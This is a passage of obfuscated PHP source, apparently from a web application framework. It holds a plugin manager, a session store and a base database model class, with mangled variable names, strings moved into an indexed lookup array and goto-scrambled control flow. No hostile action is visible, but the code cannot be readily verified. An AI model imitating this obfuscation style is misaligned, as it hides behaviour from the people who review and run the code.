($Dİ…ğèÆÓÀ[$fïºĞ±‘‘é[1758]] as $eó‘ÑÊÉ©î => $F˜ÊåŞÔÄ) { Hook::bind($eó‘ÑÊÉ©î, $F˜ÊåŞÔÄ); } } Hook::trigger($fïºĞ±‘‘é[1759]); Hook::trigger(ACTION); } public function appAllow($b¯ÇõŠä¼, $DÇªÉÁ‡š, $d“Ì…Ë–Õ¢ = true) { $f¡Æ¤Ôİ£« =& $_SERVER[¢Í]; $A™˜Õ—Í÷ = PLUGIN_DIR . $b¯ÇõŠä¼ . $f¡Æ¤Ôİ£«[1760]; if (!is_array($DÇªÉÁ‡š) || !is_array($DÇªÉÁ‡š[$f¡Æ¤Ôİ£«[1758]]) || $DÇªÉÁ‡š[$f¡Æ¤Ôİ£«[703]] != 1 || !is_file($A™˜Õ—Í÷)) { return !1; } if ($GLOBALS[$f¡Æ¤Ôİ£«[483]] == 1) { return !0; } if ($d“Ì…Ë–Õ¢ && !Action($f¡Æ¤Ôİ£«[1761])->checkAuth($b¯ÇõŠä¼)) { return !1; } return !0; } public function unInstall($Aë’Á¯ˆĞÔ) { $e…‡ÙåÓ½ =& $_SERVER[¢Í]; $e‚ŸøÎ¶ç¹ = $this->loadList($Aë’Á¯ˆĞÔ); if (file_exists(PLUGIN_DIR . $Aë’Á¯ˆĞÔ)) { Hook::apply($Aë’Á¯ˆĞÔ . $e…‡ÙåÓ½[1762]); } $this->remove($e‚ŸøÎ¶ç¹[$e…‡ÙåÓ½[392]]); } public function changeStatus($eƒ¸Å«ö‰, $c²§‹§·´‡) { $E¯Ü‡®ÖØŠ =& $_SERVER[¢Í]; $A•«ç«òŞ = $this->loadList($eƒ¸Å«ö‰); if ($c²§‹§·´‡) { Hook::apply($eƒ¸Å«ö‰ . $E¯Ü‡®ÖØŠ[1763]); } $this->update($A•«ç«òŞ[$E¯Ü‡®ÖØŠ[392]], array($E¯Ü‡®ÖØŠ[1764] => $c²§‹§·´‡)); } public function appRegist($Aè¨Ïõ«×©, $EÑÜ¢Õ¾) { $cÏô¥©„â¤ =& $_SERVER[¢Í]; $Aá¤Îà†¡å = $this->loadList($Aè¨Ïõ«×©); if ($Aá¤Îà†¡å) { $this->update($Aá¤Îà†¡å[$cÏô¥©„â¤[392]], array($cÏô¥©„â¤[1758] => $EÑÜ¢Õ¾)); } else { $AëÉ‚…ëÃÑ = array($cÏô¥©„â¤[28] => $Aè¨Ïõ«×©, $cÏô¥©„â¤[1758] => $EÑÜ¢Õ¾, $cÏô¥©„â¤[703] => 0, $cÏô¥©„â¤[6] => $this->getConfigDefault($Aè¨Ïõ«×©)); $this->insert($AëÉ‚…ëÃÑ); } } public function getConfigDefault($Cé¦ŠñÈº») { $F˜¼Ø˜šæŠ =& $_SERVER[¢Í]; $b­ƒ¡êŒÖª = array(); $A‘Ê˜å£ò§ = $this->getPackageJson($Cé¦ŠñÈº»); if (!$A‘Ê˜å£ò§ && is_array($A‘Ê˜å£ò§[$F˜¼Ø˜šæŠ[1765]])) { return $b­ƒ¡êŒÖª; } foreach ($A‘Ê˜å£ò§[$F˜¼Ø˜šæŠ[1765]] as $f„öµİ“ÀŒ => $cÉ†¿·®) { if (!isset($cÉ†¿·®[$F˜¼Ø˜šæŠ[375]]) || isset($b­ƒ¡êŒÖª[$f„öµİ“ÀŒ])) { continue; } $b­ƒ¡êŒÖª[$f„öµİ“ÀŒ] = $cÉ†¿·®[$F˜¼Ø˜šæŠ[375]]; } return $b­ƒ¡êŒÖª; } public function getPackageJson($C‹ ½¢½) { return Hook::apply($C‹ ½¢½ . $_SERVER[¢Í][1766]); } public function getConfig($eğä³ÅÚö, $EˆĞÇøÂ°Í = false) { $d—“ï¼‹î =& $_SERVER[¢Í]; $F˜Ğ»‹²¨ï = array(); $d˜öóÜé¯• = $this->loadList($eğä³ÅÚö); if ($d˜öóÜé¯• && is_array($d˜öóÜé¯•[$d—“ï¼‹î[6]])) { $F˜Ğ»‹²¨ï = $d˜öóÜé¯•[$d—“ï¼‹î[6]]; } if (!$F˜Ğ»‹²¨ï || $EˆĞÇøÂ°Í) { $F˜Ğ»‹²¨ï = $this->getConfigDefault($eğä³ÅÚö); } return $F˜Ğ»‹²¨ï; } public function setConfig($FøÙŸŠ¤ê¢, $fïµáÌÖ¶  = false) { goto c§¦Ò˜ˆí; cÍšÉÒ†Ø‹: $this->update($dµŞ¯íÍº[$c–§’¸†¿¦[392]], array($c–§’¸†¿¦[6] => $E®ºœ·ñŸñ)); goto fùù˜ã‡ÕÃ; c§¦Ò˜ˆí: $c–§’¸†¿¦ =& $_SERVER[¢Í]; $dµŞ¯íÍº = $this->loadList($FøÙŸŠ¤ê¢); if (!$dµŞ¯íÍº) { return !1; } goto aãäÊÚ„º; aãäÊÚ„º: $E®ºœ·ñŸñ = $dµŞ¯íÍº[$c–§’¸†¿¦[6]]; if ($fïµáÌÖ¶  == !1) { $E®ºœ·ñŸñ = array(); $fïµáÌÖ¶  = $this->getConfigDefault($FøÙŸŠ¤ê¢); } foreach ($fïµáÌÖ¶  as $f¦Ü¨ŠîÖ– => $aêŒÉ§ß¼ê) { $E®ºœ·ñŸñ[$f¦Ü¨ŠîÖ–] = is_string($aêŒÉ§ß¼ê) ? trim($aêŒÉ§ß¼ê) : $aêŒÉ§ß¼ê; } goto cÍšÉÒ†Ø‹; fùù˜ã‡ÕÃ: } public function viewList() { goto câˆƒÌ¯Å„; b²©°ÍùÙ’: $FíÎ¶Å¿ë‹ = $this->loadPluginList(); $DïõŸÒİĞå = array(); foreach ($FíÎ¶Å¿ë‹ as $Cù¹İ¥ˆ­ => $BŸ®Ï›¦Ïí) { unset($BŸ®Ï›¦Ïí[$aÂ•§ãµï[1758]], $BŸ®Ï›¦Ïí[$aÂ•§ãµï[6]]); $Fœ¾µ¥É’’ = PLUGIN_DIR . $BŸ®Ï›¦Ïí[$aÂ•§ãµï[28]] . $aÂ•§ãµï[1760]; if (!is_file($Fœ¾µ¥É’’)) { continue; } $eãˆ‘ŒÎ±‰ = Hook::apply($BŸ®Ï›¦Ïí[$aÂ•§ãµï[28]] . $aÂ•§ãµï[1766]); if (is_array($eãˆ‘ŒÎ±‰)) { $DïõŸÒİĞå[$Cù¹İ¥ˆ­] = array_merge($BŸ®Ï›¦Ïí, $eãˆ‘ŒÎ±‰); } } goto e®‹ï¹Ü‰; câˆƒÌ¯Å„: $aÂ•§ãµï =& $_SERVER[¢Í]; $FíÎ¶Å¿ë‹ = $this->loadList(); $this->pluginScan($FíÎ¶Å¿ë‹); goto b²©°ÍùÙ’; e®‹ï¹Ü‰: return $DïõŸÒİĞå; goto b‡Ü†¹¾„í; b‡Ü†¹¾„í: } private function loadPluginList() { $aÈÓ¿ç¤—› =& $_SERVER[¢Í]; $c…ø‰ŸÂŒ© = $this->loadList(); if (strtolower(MOD) == $aÈÓ¿ç¤—›[1767]) { return $c…ø‰ŸÂŒ©; } $e˜İ£¡õÅ = Hook::trigger($aÈÓ¿ç¤—›[1768], $c…ø‰ŸÂŒ©); if ($c…ø‰ŸÂŒ© && !$e˜İ£¡õÅ) { die; } return $e˜İ£¡õÅ ? $e˜İ£¡õÅ : $c…ø‰ŸÂŒ©; } private function pluginScan($Bã¥Ø¶ÈÑ—) { $eÁ—¾‘á¬ =& $_SERVER[¢Í]; recursion_dir(PLUGIN_DIR, $b¬‚¥¬÷‚â, $BÓ¼„µ‘“ß, 0); foreach ($b¬‚¥¬÷‚â as $CƒèÆèê»Ş) { $bàó­«Åß = get_path_this($CƒèÆèê»Ş); if (isset($Bã¥Ø¶ÈÑ—[$bàó­«Åß]) || !file_exists($CƒèÆèê»Ş . $eÁ—¾‘á¬[1769]) || !file_exists($CƒèÆèê»Ş . $eÁ—¾‘á¬[1760])) { continue; } Hook::apply($bàó­«Åß . $eÁ—¾‘á¬[1763]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\x74\x65\x6d\137\163\x65\x73\163\x69\157\x6e"; public function get($AáÜÜù“¿) { $aÖ‰³à¡‡± =& $_SERVER[¢Í]; $AÏî¨ñƒ•ì = $this->where(array($aÖ‰³à¡‡±[1770] => $AáÜÜù“¿))->find(); if (!is_array($AÏî¨ñƒ•ì)) { return !1; } return $AÏî¨ñƒ•ì[$aÖ‰³à¡‡±[706]]; } public function set($Dƒ„Ã£…, $EíÛ÷íÌ÷â, $D¦‹­©†¦À = 3600) { $D ±ØÍš»Ê =& $_SERVER[¢Í]; $A¡êÓâ„Ú = array($D ±ØÍš»Ê[1770] => $Dƒ„Ã£…, $D ±ØÍš»Ê[1682] => $EíÛ÷íÌ÷â, $D ±ØÍš»Ê[1771] => $D¦‹­©†¦À + time()); if (Session::get($D ±ØÍš»Ê[1772])) { $A¡êÓâ„Ú[$D ±ØÍš»Ê[1489]] = Session::get($D ±ØÍš»Ê[1772]); } else { $A¡êÓâ„Ú[$D ±ØÍš»Ê[1489]] = 0; } if ($this->get($Dƒ„Ã£…)) { return $this->where(array($D ±ØÍš»Ê[1770] => $Dƒ„Ã£…))->save($A¡êÓâ„Ú); } else { return $this->add($A¡êÓâ„Ú, array(), !0); } } public function remove($fÙÑ¶å•…—) { return $this->where(array($_SERVER[¢Í][1770] => $fÙÑ¶å•…—))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¢Í][1773] . time())->delete(); } } goto FÏÍç‡¯ôì; Fò–‹±ß”: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\x6c\145", "\157\x72\144\x65\x72", "\141\154\151\141\163", "\x68\x61\x76\151\x6e\147", "\x67\x72\157\x75\160", "\154\157\143\153", "\x64\151\163\x74\151\156\x63\164", "\141\x75\164\157", "\146\151\154\x74\145\x72", "\x76\x61\x6c\x69\x64\141\x74\x65", "\162\145\x73\165\154\x74", "\142\151\x6e\x64", "\164\x6f\x6b\145\156"); public function __construct($b––ÊĞ›÷ = '', $aº­Ñâ‰¾½ = '', $dš†à»¬´¨ = '') { $Fˆ‘Ù’Ÿ¬› =& $_SERVER[¢Í]; $this->_initialize(); if (!empty($b––ÊĞ›÷)) { if (strpos($b––ÊĞ›÷, $Fˆ‘Ù’Ÿ¬›[101])) { list($this->dbName, $this->name) = explode($Fˆ‘Ù’Ÿ¬›[101], $b––ÊĞ›÷); } else { $this->name = $b––ÊĞ›÷; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($aº­Ñâ‰¾½)) { $this->tablePrefix = $Fˆ‘Ù’Ÿ¬›[33]; } elseif ($Fˆ‘Ù’Ÿ¬›[33] != $aº­Ñâ‰¾½) { $this->tablePrefix = $aº­Ñâ‰¾½; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Fˆ‘Ù’Ÿ¬›[247]); } $this->db(0, empty($this->connection) ? $dš†à»¬´¨ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $e•İ­‚¢ =& $_SERVER[¢Í]; if (empty($this->fields)) { if (think_config($e•İ­‚¢[248])) { $EÈİë´„îÌ = $this->dbName ? $this->dbName : think_config($e•İ­‚¢[249]); $Cá¿£´ŞÌÌ = think_var_cache($e•İ­‚¢[250] . strtolower(get_path_this($EÈİë´„îÌ) . $e•İ­‚¢[101] . $this->name)); if ($Cá¿£´ŞÌÌ) { $d¶ÀãÃÀÎ© = think_config($e•İ­‚¢[251]); if (empty($d¶ÀãÃÀÎ©) || $Cá¿£´ŞÌÌ[$e•İ­‚¢[252]] == $d¶ÀãÃÀÎ©) { $this->fields = $Cá¿£´ŞÌÌ; return; } } } $this->flush(); } } public function flush() { goto dª®™ÕŒµÃ; bøèóëâ‹: foreach ($aÎ‹Ş¢«Ä as $fàŸİíÁå => $D­¼½ß¸) { $A…—°Œğ®[$fàŸİíÁå] = $D­¼½ß¸[$fÃáÓÙ’«[29]]; if ($D­¼½ß¸[$fÃáÓÙ’«[36]]) { $this->fields[$fÃáÓÙ’«[254]] = $fàŸİíÁå; if ($D­¼½ß¸[$fÃáÓÙ’«[39]]) { $this->fields[$fÃáÓÙ’«[253]] = !0; } } } $this->fields[$fÃáÓÙ’«[255]] = $A…—°Œğ®; if (think_config($fÃáÓÙ’«[251])) { $this->fields[$fÃáÓÙ’«[252]] = think_config($fÃáÓÙ’«[251]); } goto EÅÂÛ”µ…; EÅÂÛ”µ…: if (think_config($fÃáÓÙ’«[248])) { $f˜¤±÷­Ş¬ = $this->dbName ? $this->dbName : think_config($fÃáÓÙ’«[249]); think_var_cache($fÃáÓÙ’«[250] . strtolower(get_path_this($f˜¤±÷­Ş¬) . $fÃáÓÙ’«[101] . $this->name), $this->fields); } goto c‡Èˆ‘ëää; dª®™ÕŒµÃ: $fÃáÓÙ’« =& $_SERVER[¢Í]; $this->db->setModel($this->name); $aÎ‹Ş¢«Ä = $this->db->getFields($this->getTableName()); goto aÇ¬Ë‰‹¨Ÿ; aÇ¬Ë‰‹¨Ÿ: if (!$aÎ‹Ş¢«Ä) { return !1; } $this->fields = array_keys($aÎ‹Ş¢«Ä); $this->fields[$fÃáÓÙ’«[253]] = !1; goto bøèóëâ‹; c‡Èˆ‘ëää: } public function switchModel($bÀ¬İåƒÃ, $Dí’İ¼» = array()) { $B²§œÙ˜Ò =& $_SERVER[¢Í]; $A–×ÃŒù = ucwords(strtolower($bÀ¬İåƒÃ)) . $B²§œÙ˜Ò[256]; if (!class_exists($A–×ÃŒù)) { think_exception($A–×ÃŒù . think_lang($B²§œÙ˜Ò[257])); } $this->_extModel = new $A–×ÃŒù($this->name); if (!empty($Dí’İ¼»)) { foreach ($Dí’İ¼» as $b¹ÅÈçÑ˜÷) { $this->_extModel->setProperty($b¹ÅÈçÑ˜÷, $this->{$b¹ÅÈçÑ˜÷}); } } return $this->_extModel; } public function __set($cƒ¬·ÛÅÀ, $D¡Á‰½ë…) { $this->data[$cƒ¬·ÛÅÀ] = $D¡Á‰½ë…; } public function __get($Cî‰ğ‹´ç) { return isset($this->data[$Cî‰ğ‹´ç]) ? $this->data[$Cî‰ğ‹´ç] : null; } public function __isset($aĞÎ¹—ã­) { return isset($this->data[$aĞÎ¹—ã­]); } public function __unset($bØ©•ÈÖ›©) { unset($this->data[$bØ©•ÈÖ›©]); } public function __call($E±ç°åìœ, $dêõ‚µ¿“ù) { $aĞãäâãÕï =& $_SERVER[¢Í]; if (in_array(strtolower($E±ç°åìœ), $this->methods, !0)) { $this->options[strtolower($E±ç°åìœ)] = $dêõ‚µ¿“ù[0]; return $this; } elseif (in_array(strtolower($E±ç°åìœ), array($aĞãäâãÕï[258], $aĞãäâãÕï[259], $aĞãäâãÕï[260], $aĞãäâãÕï[261], $aĞãäâãÕï[262]), !0)) { $FŠ‘ °ù»´ = isset($dêõ‚µ¿“ù[0]) ? $dêõ‚µ¿“ù[0] : $aĞãäâãÕï[190]; $FŠ‘ °ù»´ = $this->db->parseKey($FŠ‘ °ù»´); return $this->getField(strtoupper($E±ç°åìœ) . $aĞãäâãÕï[263] . $FŠ‘ °ù»´ . $aĞãäâãÕï[264] . $E±ç°åìœ, $aĞãäâãÕï[258]); } elseif (strtolower(substr($E±ç°åìœ, 0, 5)) == $aĞãäâãÕï[265]) { $FŠ‘ °ù»´ = think_parse_name(substr($E±ç°åìœ, 5)); $c²ï”ä©­[$FŠ‘ °ù»´] = $dêõ‚µ¿“ù[0]; return $this->where($c²ï”ä©­)->find(); } elseif (strtolower(substr($E±ç°åìœ, 0, 10)) == $aĞãäâãÕï[266]) { $aÚ­Æñ‚ß½ = think_parse_name(substr($E±ç°åìœ, 10)); $c²ï”ä©­[$aÚ­Æñ‚ß½] = $dêõ‚µ¿“ù[0]; return $this->where($c²ï”ä©­)->getField($dêõ‚µ¿“ù[1]); } elseif (isset($this->_scope[$E±ç°åìœ])) { return $this->scope($E±ç°åìœ, $dêõ‚µ¿“ù[0]); } elseif (method_exists($this, $E±ç°åìœ)) { array_unshift($dêõ‚µ¿“ù, $E±ç°åìœ); return call_user_func_array(array($this, $aĞãäâãÕï[267]), $dêõ‚µ¿“ù); } else { return call_user_func_array(array(parent, $E±ç°åìœ), $dêõ‚µ¿“ù); } } protected function call() { goto cèŠ·²˜¤è; DÂêÒĞ³¥º: $d”º‡ÁÓã§ = $A¾×®£í¾»; if (is_array($A¾×®£í¾»)) { $d”º‡ÁÓã§ = $A¾×®£í¾»[1]; $A¾×®£í¾» = $A¾×®£í¾»[0]; } $FªŸ¡áÂÕ = count($c÷áÇšè …) - 1; goto fö­ŠÌ«™; C”…æĞ¢¹ç: $d‰•˜¤§¦ = call_user_func_array(array($this, $A¾×®£í¾»), $c÷áÇšè …); if (method_exists($this, $Aãì¶Á¤Ô™[271])) { $Bö”¨ÃŞî = call_user_func_array(array($this, $Aãì¶Á¤Ô™[272]), array($d”º‡ÁÓã§, $c÷áÇšè …, $d‰•˜¤§¦)); if ($Bö”¨ÃŞî) { return $Bö”¨ÃŞî; } } return $d‰•˜¤§¦; goto D”«õ˜§•—; cèŠ·²˜¤è: $Aãì¶Á¤Ô™ =& $_SERVER[¢Í]; $c÷áÇšè … = func_get_args(); $A¾×®£í¾» = array_shift($c÷áÇšè …); goto DÂêÒĞ³¥º; fö­ŠÌ«™: if (isset($c÷áÇšè …[$FªŸ¡áÂÕ]) && $c÷áÇšè …[$FªŸ¡áÂÕ] === $A¾×®£í¾») { think_exception(__CLASS__ . $Aãì¶Á¤Ô™[4] . $A¾×®£í¾» . think_lang($Aãì¶Á¤Ô™[268])); return; } $c÷áÇšè …[] = $A¾×®£í¾»; if (method_exists($this, $Aãì¶Á¤Ô™[269])) { $Bö”¨ÃŞî = call_user_func_array(array($this, $Aãì¶Á¤Ô™[270]), array($d”º‡ÁÓã§, $c÷áÇšè …)); if (!is_null($Bö”¨ÃŞî) && $Bö”¨ÃŞî !== !1) { return $Bö”¨ÃŞî; } } goto C”…æĞ¢¹ç; D”«õ˜§•—: } protected function _initialize() { } protected function _facade($C‰ó¸ˆ„Ñ) { $bªø¶¤¬ª =& $_SERVER[¢Í]; if (!empty($this->fields)) { foreach ($C‰ó¸ˆ„Ñ as $F“´°Š†³„ => $f§¸µ»õÙ) { if (is_array($this->fields) && !in_array($F“´°Š†³„, $this->fields, !0)) { unset($C‰ó¸ˆ„Ñ[$F“´°Š†³„]); } elseif (is_scalar($f§¸µ»õÙ)) { $this->_parseType($C‰ó¸ˆ„Ñ, $F“´°Š†³„); } } } if (!empty($this->options[$bªø¶¤¬ª[273]])) { $C‰ó¸ˆ„Ñ = array_map($this->options[$bªø¶¤¬ª[273]], $C‰ó¸ˆ„Ñ); unset($this->options[$bªø¶¤¬ª[273]]); } $this->_beforeWrite($C‰ó¸ˆ„Ñ); return $C‰ó¸ˆ„Ñ; } protected function _beforeWrite(&$a’Î¯é«í) { } public function add($aÛèĞÕ ´  = '', $E–Æ¡ŸöÙ† = array(), $eºŒ™ŸàÕÆ = false) { goto aîìè‚—Óˆ; AÙÛÅ–ò–Ì: return $a³Úé’Í¨…; goto Bï…÷°ä‚; aîìè‚—Óˆ: if (empty($aÛèĞÕ ´ )) { if (!empty($this->data)) { $aÛèĞÕ ´  = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¢Í][274]); return !1; } } $E–Æ¡ŸöÙ† = $this->_parseOptions($E–Æ¡ŸöÙ†); $aÛèĞÕ ´  = $this->_facade($aÛèĞÕ ´ ); goto Fï©´‹ºâ…; Fï©´‹ºâ…: if (!1 === $this->_beforeInsert($aÛèĞÕ ´ , $E–Æ¡ŸöÙ†)) { return !1; } $a³Úé’Í¨… = $this->db->insert($aÛèĞÕ ´ , $E–Æ¡ŸöÙ†, $eºŒ™ŸàÕÆ); if (!1 !== $a³Úé’Í¨…) { $eìÇ«Ş²¡‹ = $this->getLastInsID(); if ($eìÇ«Ş²¡‹) { $aÛèĞÕ ´ [$this->getPk()] = $eìÇ«Ş²¡‹; $this->_after_insert($aÛèĞÕ ´ , $E–Æ¡ŸöÙ†); return $eìÇ«Ş²¡‹; } $this->_after_insert($aÛèĞÕ ´ , $E–Æ¡ŸöÙ†); } goto AÙÛÅ–ò–Ì; Bï…÷°ä‚: } protected function _beforeInsert(&$D¥«àíŠ·ì, $CçÌÅêñ¥) { } protected function _after_insert($FñÓÌÅËÓ, $e¾¯Îõ“…Œ) { } public function addAll($B„•ßÆêĞ«, $b‹ÒŒÉ© = array(), $d˜çÕ‡‹÷ˆ = false) { goto FÂÅÈÆŒ´Ö; cù˜éÓ‹Ú: return $Fõ¢”ÔÓøï; goto d¿óë·¥¼ ; DÇõÛ”¯: foreach ($B„•ßÆêĞ« as $cìÇ¤ğÙâ => $a¹µ¡¨‹ãÌ) { $B„•ßÆêĞ«[$cìÇ¤ğÙâ] = $this->_facade($a¹µ¡¨‹ãÌ); } if (method_exists($this->db, $fÙå§Óª µ[275])) { $Fõ¢”ÔÓøï = $this->db->insertAll($B„•ßÆêĞ«, $b‹ÒŒÉ©, $d˜çÕ‡‹÷ˆ); } else { $this->startTrans(); foreach ($B„•ßÆêĞ« as $cìÇ¤ğÙâ => $a¹µ¡¨‹ãÌ) { $Fõ¢”ÔÓøï = $this->db->insert($a¹µ¡¨‹ãÌ, $b‹ÒŒÉ©, $d˜çÕ‡‹÷ˆ); } $this->commit(); } if (!1 !== $Fõ¢”ÔÓøï) { $BåÍ­ÙÔ¼ = $this->getLastInsID(); if ($BåÍ­ÙÔ¼) { return $BåÍ­ÙÔ¼; } } goto cù˜éÓ‹Ú; FÂÅÈÆŒ´Ö: $fÙå§Óª µ =& $_SERVER[¢Í]; if (empty($B„•ßÆêĞ«)) { $this->error = think_lang($fÙå§Óª µ[274]); return !1; } $b‹ÒŒÉ© = $this->_parseOptions($b‹ÒŒÉ©); goto DÇõÛ”¯; d¿óë·¥¼ : } public function selectAdd($fÌ…ŠŒ = '', $dÔÁ†ÓÔÇ÷ = '', $BÎÊ¶×ÈÇ¨ = array()) { $Fø‹ñÃ­‹ê =& $_SERVER[¢Í]; $BÎÊ¶×ÈÇ¨ = $this->_parseOptions($BÎÊ¶×ÈÇ¨); if (!1 === ($CïãÁæÏÕù = $this->db->selectInsert($fÌ…ŠŒ ? $fÌ…ŠŒ : $BÎÊ¶×ÈÇ¨[$Fø‹ñÃ­‹ê[276]], $dÔÁ†ÓÔÇ÷ ? $dÔÁ†ÓÔÇ÷ : $this->getTableName(), $BÎÊ¶×ÈÇ¨))) { $this->error = think_lang($Fø‹ñÃ­‹ê[277]); return !1; } else { return $CïãÁæÏÕù; } } public function save($D‡‚ÚÅ½É = '', $déØí†„Èæ = array()) { goto fóá±î²°Æ; b‘ÏÛ§àÂ‡: if (!1 !== $bŸÑİ¦¨¯) { if (isset($B¥¥»çôŸä)) { $D‡‚ÚÅ½É[$Dã¿º¯³ò] = $B¥¥»çôŸä; } $this->_afterUpdate($D‡‚ÚÅ½É, $déØí†„Èæ); } return $bŸÑİ¦¨¯; goto bî×Ö•Ë; F®µ—å¼™ª: if (is_array($déØí†„Èæ[$a‘Ô…ßÓÉ[278]]) && isset($déØí†„Èæ[$a‘Ô…ßÓÉ[278]][$Dã¿º¯³ò])) { $B¥¥»çôŸä = $déØí†„Èæ[$a‘Ô…ßÓÉ[278]][$Dã¿º¯³ò]; } if (!1 === $this->_beforeUpdate($D‡‚ÚÅ½É, $déØí†„Èæ)) { return !1; } $bŸÑİ¦¨¯ = $this->db->update($D‡‚ÚÅ½É, $déØí†„Èæ); goto b‘ÏÛ§àÂ‡; aá«¸„ò´›: $déØí†„Èæ = $this->_parseOptions($déØí†„Èæ); $Dã¿º¯³ò = $this->getPk(); if (!isset($déØí†„Èæ[$a‘Ô…ßÓÉ[278]])) { if (isset($D‡‚ÚÅ½É[$Dã¿º¯³ò])) { $eÏõÔõ«Ï³[$Dã¿º¯³ò] = $D‡‚ÚÅ½É[$Dã¿º¯³ò]; $déØí†„Èæ[$a‘Ô…ßÓÉ[278]] = $eÏõÔõ«Ï³; unset($D‡‚ÚÅ½É[$Dã¿º¯³ò]); } else { $this->error = think_lang($a‘Ô…ßÓÉ[277]); return !1; } } goto F®µ—å¼™ª; fóá±î²°Æ: $a‘Ô…ßÓÉ =& $_SERVER[¢Í]; if (empty($D‡‚ÚÅ½É)) { if (!empty($this->data)) { $D‡‚ÚÅ½É = $this->data; $this->data = array(); } else { $this->error = think_lang($a‘Ô…ßÓÉ[274]); return !1; } } $D‡‚ÚÅ½É = $this->_facade($D‡‚ÚÅ½É); goto aá«¸„ò´›; bî×Ö•Ë: } protected function _beforeUpdate(&$B’ŸãÜ¿îÖ, $B¾ÁØ·ò„Ê) { } protected function _afterUpdate($DØ£„Íç‚‚, $CÌñ˜à“£) { } public function delete($d¢ÓÏöß® = array()) { goto B¢èŸè–²; a½ƒ—è´Àô: if (is_numeric($d¢ÓÏöß®) || is_string($d¢ÓÏöß®)) { if (strpos($d¢ÓÏöß®, $eŒ£ó¶Øç[47])) { $DšïÜÃ™œ¦[$CŠ«µ‘ç¦¬] = array($eŒ£ó¶Øç[279], $d¢ÓÏöß®); } else { $DšïÜÃ™œ¦[$CŠ«µ‘ç¦¬] = $d¢ÓÏöß®; } $this->options[$eŒ£ó¶Øç[278]] = $DšïÜÃ™œ¦; } $d¢ÓÏöß® = $this->_parseOptions(); if (is_array($d¢ÓÏöß®[$eŒ£ó¶Øç[278]]) && isset($d¢ÓÏöß®[$eŒ£ó¶Øç[278]][$CŠ«µ‘ç¦¬])) { $AÌøÂŞÃæ = $d¢ÓÏöß®[$eŒ£ó¶Øç[278]][$CŠ«µ‘ç¦¬]; } goto f‘èÇ˜É•ì; f‘èÇ˜É•ì: $b…Á½ºÊÖÉ = $this->db->delete($d¢ÓÏöß®); if (!1 !== $b…Á½ºÊÖÉ) { $c’Ù¹ËİŠ° = array(); if (isset($AÌøÂŞÃæ)) { $c’Ù¹ËİŠ°[$CŠ«µ‘ç¦¬] = $AÌøÂŞÃæ; } $this->_after_delete($c’Ù¹ËİŠ°, $d¢ÓÏöß®); } return $b…Á½ºÊÖÉ; goto F”Ÿì«‹ô­; B¢èŸè–²: $eŒ£ó¶Øç =& $_SERVER[¢Í]; if (empty($d¢ÓÏöß®) && empty($this->options[$eŒ£ó¶Øç[278]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $CŠ«µ‘ç¦¬ = $this->getPk(); goto a½ƒ—è´Àô; F”Ÿì«‹ô­: } protected function _after_delete($F–æƒ’ÌÌØ, $A¯‡¨ÑÕíÉ) { } public function select($f‚’‡»ëßŸ = array()) { goto D”Ñ°§‘½Ÿ; DŒ°ïª‘Ê: $this->_afterSelect($FĞŸ‰Ğ˜“, $f‚’‡»ëßŸ); return $FĞŸ‰Ğ˜“; goto eÛ›ƒ°ªË÷; D”Ñ°§‘½Ÿ: $F‰°‘Š†Œ =& $_SERVER[¢Í]; if (is_string($f‚’‡»ëßŸ) || is_numeric($f‚’‡»ëßŸ)) { $F¶¢ò„í¸ = $this->getPk(); if (strpos($f‚’‡»ëßŸ, $F‰°‘Š†Œ[47])) { $BÄÖ˜ÏŠß‡[$F¶¢ò„í¸] = array($F‰°‘Š†Œ[279], $f‚’‡»ëßŸ); } else { $BÄÖ˜ÏŠß‡[$F¶¢ò„í¸] = $f‚’‡»ëßŸ; } $this->options[$F‰°‘Š†Œ[278]] = $BÄÖ˜ÏŠß‡; } elseif (!1 === $f‚’‡»ëßŸ) { $f‚’‡»ëßŸ = $this->_parseOptions(); return $F‰°‘Š†Œ[280] . $this->db->buildSelectSql($f‚’‡»ëßŸ) . $F‰°‘Š†Œ[281]; } $f‚’‡»ëßŸ = $this->_parseOptions(); goto B¥àØ„À¢Â; B¥àØ„À¢Â: $FĞŸ‰Ğ˜“ = $this->db->select($f‚’‡»ëßŸ); if (!1 === $FĞŸ‰Ğ˜“) { return !1; } if (empty($FĞŸ‰Ğ˜“)) { return null; } goto DŒ°ïª‘Ê; eÛ›ƒ°ªË÷: } protected function _afterSelect(&$aÌ“èŠÁº, $EŞ¶åŒÓ°) { } public function buildSql($BŠ¸¨ŸÆÁÅ = array()) { $AÛóõ¤êŠó =& $_SERVER[¢Í]; $BŠ¸¨ŸÆÁÅ = $this->_parseOptions($BŠ¸¨ŸÆÁÅ); return $AÛóõ¤êŠó[280] . $this->db->buildSelectSql($BŠ¸¨ŸÆÁÅ) . $AÛóõ¤êŠó[281]; } public function optionsValue($B„®êë•ª‚ = null) { if (is_null($B„®êë•ª‚)) { return $this->options; } elseif (is_array($B„®êë•ª‚)) { $this->options = array_merge($this->options, $B„®êë•ª‚); } } protected function _parseOptions($dÍçÊÈÒËš = array()) { goto a÷óÏÙÏß; a÷óÏÙÏß: $b¬¶¨åèİ =& $_SERVER[¢Í]; if (is_array($dÍçÊÈÒËš)) { $dÍçÊÈÒËš = array_merge($this->options, $dÍçÊÈÒËš); } $this->options = array(); goto EòÎç˜³­÷; EòÎç˜³­÷: if (!isset($dÍçÊÈÒËš[$b¬¶¨åèİ[282]])) { $dÍçÊÈÒËš[$b¬¶¨åèİ[282]] = $this->getTableName(); $dííœãœ´– = $this->fields; } else { $dííœãœ´– = $this->getDbFields(); } if (!empty($dÍçÊÈÒËš[$b¬¶¨åèİ[283]])) { $dÍçÊÈÒËš[$b¬¶¨åèİ[282]] .= $b¬¶¨åèİ[50] . 